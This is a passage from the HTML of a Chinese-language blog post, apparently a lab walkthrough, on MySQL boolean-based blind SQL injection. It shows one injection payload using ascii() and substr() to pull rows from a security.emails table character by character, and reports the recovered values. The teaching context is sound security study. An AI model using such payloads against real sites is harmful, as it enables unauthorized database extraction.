+<h2 id="3-获取数据的内容"><a href="#3-获取数据的内容" class="headerlink" title="3.获取数据的内容"></a>3.获取数据的内容</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通过ascii和substr函数 截取字符串进行数据对比</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select ascii(substr(id,1,1)) from security.emails limit 0,1)=? -- x</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919082207658.png" class="">
+
+<p>获取到第一条数据<code>id</code>的值为:<code>1</code>，同理得到<code>email_id</code>的值为<code>Dumb@dhakkan.com</code></p>
+<p>其他数据获取方式同样！</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/09/18/web%E5%AE%89%E5%85%A8/mysql-cookie%E6%B3%A8%E5%85%A5/" rel="prev" title="mysql-cookie注入">
+                  <i class="fa fa-chevron-left"></i> mysql-cookie注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xf</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
